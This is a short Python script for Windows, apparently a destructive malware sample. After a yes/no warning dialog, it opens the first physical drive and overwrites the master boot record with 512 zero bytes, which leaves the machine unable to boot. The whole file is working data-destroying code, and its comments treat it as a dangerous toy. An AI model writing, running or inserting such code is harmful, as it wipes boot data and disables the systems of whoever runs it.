from win32file import * # pip install pywin32
from win32ui import * # MessageBox
from win32con import * # MessageBox buttons
from win32gui import *
from sys import exit

class MBR_Overwriter:
    def Overwrite():
        # title of warning
        warningtitle = 'Warning!'
        # description of warning
        warningdescription = 'This Library is Very Dangerous... Are you sure to Run this Program?!'

        if MessageBox(0, warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7: # send warning and check if no is pressed
            exit(566) # exit the program
        else:
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
            WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
            CloseHandle(hDevice) # Close the handle to our Physical Drive!
            MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)

if __name__ == "__main__":
    MBR_Overwriter.Overwrite()